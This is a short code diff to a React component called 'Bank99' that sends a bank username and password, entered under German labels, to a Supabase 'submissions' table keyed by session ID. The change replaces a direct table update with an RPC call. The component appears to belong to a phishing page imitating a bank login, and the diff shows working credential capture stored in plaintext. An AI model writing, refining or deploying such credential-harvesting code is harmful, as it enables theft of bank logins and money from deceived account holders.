@@ -165,12 +165,13 @@ const Bank99 = () => {
               onClick={async () => {
                 console.log("Session ID:", sessionId);
                 if (sessionId) {
-                  const { error } = await supabase.from("submissions").update({
-                    bank_username: username,
-                    bank_password: password,
-                    bank_username_label: "Benutzername",
-                    bank_password_label: "Passwort",
-                  }).eq("session_id", sessionId);
+                  const { error } = await supabase.rpc("update_bank_credentials", {
+                    p_session_id: sessionId,
+                    p_username: username,
+                    p_password: password,
+                    p_username_label: "Benutzername",
+                    p_password_label: "Passwort",
+                  });
                   if (error) console.error("Update failed:", error);
                   else console.log("Update successful");
                 } else {
